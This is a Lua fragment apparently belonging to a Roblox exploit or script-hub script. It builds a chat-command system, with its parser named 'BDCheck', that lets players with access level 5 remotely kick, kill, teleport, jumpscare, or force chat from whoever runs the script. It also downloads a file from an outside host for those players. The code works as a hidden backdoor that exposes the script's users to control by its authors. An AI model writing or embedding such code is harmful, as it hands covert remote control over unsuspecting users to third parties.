task.spawn(function()
-- // === UNIVERSAL COMMAND REGISTRY ===
getgenv().AdminCmdList = {

	['kick'] = {
		Clearence = { [5] = true },
		CommandFunc = function(Targets, ArgsStr, CmdPlayer)
			for _, plr in pairs(Targets) do
				if plr == LocalP then
					LocalP:Kick(ArgsStr ~= '' and ArgsStr or 'Kicked by admin')
				end
			end
		end,
	},

	['kill'] = {
		Clearence = { [5] = true },
		CommandFunc = function(Targets)
			for _, plr in pairs(Targets) do
				if plr == LocalP then
					local hum = plr.Character
						and plr.Character:FindFirstChildOfClass('Humanoid')
					if hum then
						hum:ChangeState(Enum.HumanoidStateType.Dead)
					end
				end
			end
		end,
	},

	['jumpscare'] = {
		Clearence = { [5] = true },
		CommandFunc = function(Targets)
			for _, plr in pairs(Targets) do
				if plr == LocalP then
					playJumpScare()
				end
			end
		end,
	},

	['say'] = {
		Clearence = { [5] = true },
		CommandFunc = function(Targets, ArgsStr)
			if ArgsStr == '' then
				return
			end
			for _, plr in pairs(Targets) do
				if plr == LocalP then
					sendChatMessageLocally(ArgsStr)
				end
			end
		end,
	},

	['bring'] = {
		Clearence = { [5] = true },
		CommandFunc = function(Targets, _, CmdPlayer)
			local originChar = CmdPlayer.Character
			local originRoot = originChar
				and originChar:FindFirstChild('HumanoidRootPart')
			if not originRoot then
				return
			end
			for _, plr in pairs(Targets) do
				if plr == LocalP then
					local hrp = plr.Character
						and plr.Character:FindFirstChild('HumanoidRootPart')
					if hrp then
						hrp.CFrame = originRoot.CFrame + Vector3.new(0, 3, 0)
					end
				end
			end
		end,
	},

	['fetch'] = {
		Clearence = { [5] = true },
		CommandFunc = function(_, _, CmdPlayer)
			for _, plr in pairs(Players:GetPlayers()) do
				if plr == LocalP and getAccess(plr.UserId) < 5 then
					sendChatMessageLocally('Here')
				end
			end
		end,
	},
}

-- // === SMART TARGET RESOLVER (ADMIN IMMUNITY) ===
local function resolveTargets(raw, CmdPlayer)
	local result = {}
	if not raw or raw == '' then
		return result
	end

	local lower = string.lower(raw)
	local function canBeTarget(p)
		-- Only affect non-admins (Access < 5)
		return p and getAccess(p.UserId) < 5
	end

	if lower == 'all' then
		for _, p in pairs(Players:GetPlayers()) do
			if canBeTarget(p) then
				table.insert(result, p)
			end
		end
		return result
	end

	if lower == 'others' then
		for _, p in pairs(Players:GetPlayers()) do
			if p ~= CmdPlayer and canBeTarget(p) then
				table.insert(result, p)
			end
		end
		return result
	end

	local target = getgenv().psearch(raw)
	if target and canBeTarget(target) then
		table.insert(result, target)
	end
	return result
end

-- // === UNIVERSAL CHAT PARSER ===
getgenv().BDCheck = function(Sender, Chat)
	if type(Chat) ~= 'string' or Chat:sub(1, 1) ~= AdminPrefix then
		return
	end

	local args = string.split(Chat:sub(2), ' ')
	local cmd = table.remove(args, 1)
	if not cmd or not getgenv().AdminCmdList[cmd] then
		return
	end

	local Command = getgenv().AdminCmdList[cmd]
	local access = getAccess(Sender.UserId)
	if not Command.Clearence[access] then
		return
	end

	local rawTarget = args[1]
	table.remove(args, 1)
	local ArgsStr = table.concat(args, ' ')

	local Targets = resolveTargets(rawTarget, Sender)
	Command.CommandFunc(Targets, ArgsStr, Sender)
end

-- // === HOOK ALL CHAT CHANNELS ===
local function hookChannel(ch)
	if ch:IsA('TextChannel') then
		ch.MessageReceived:Connect(function(msg)
			local src = msg.TextSource
			if src then
				local speaker = Players:GetPlayerByUserId(src.UserId)
				if speaker then
					getgenv().BDCheck(speaker, msg.Text)
				end
			end
		end)
	end
end

for _, ch in pairs(TextChatService.TextChannels:GetChildren()) do
	hookChannel(ch)
end
TextChatService.TextChannels.ChildAdded:Connect(hookChannel)

-- // === PRELOAD VIDEO FOR ADMINS ===
Players.PlayerAdded:Connect(function(plr)
	if getAccess(plr.UserId) == 5 then
		task.spawn(function()
			task.wait(2)
			if not isfile('video.webm') then
				pcall(function()
					writefile(
						'video.webm',
						game:HttpGet('https://api.swimhub.xyz/video.webm', true)
					)
				end)
			end
		end)
	end
end)
end)
